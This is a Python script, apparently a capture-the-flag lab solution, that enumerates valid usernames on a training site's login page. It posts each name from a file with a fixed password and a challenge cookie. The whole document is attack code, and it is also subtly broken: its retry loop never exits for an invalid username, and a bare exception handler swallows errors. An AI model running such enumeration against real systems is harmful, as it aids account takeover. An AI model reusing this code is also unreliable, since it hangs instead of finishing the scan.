import requests as rq
from time import sleep

url = "http://billing.vulntraining.co.uk/login"
file = "../usernames.txt"

cookie_file = open("../cookie.txt", "r")
cookie = cookie_file.readline().strip()

usernames = []
with open(file, "r") as f:
    N = len(f.readlines())

with open(file, "r") as f:
    i = 1
    for user in f:
        print("________________________________________________________________________________")
        print(f"- Trying: {user} -> {i}/{N}")
        i += 1
        payload = {"username": user, "password": "pass"}
        header = {"Cookie": "ctfchallenge="+cookie}
        while True:
            try:
                req = rq.post(url, data= payload, headers= header)
                resp = req.text
                print(f"- Resp: {req.status_code}\n")
                if "Username is invalid" not in resp:
                    if req.status_code == 200:
                        print(f"[*] Username found: {user}\n")
                        usernames.append(user)
                        sleep(0.1)
                        break
            except:
                continue
print("*** FOUND ***")
for user in usernames:
    print(user)
    print("\n")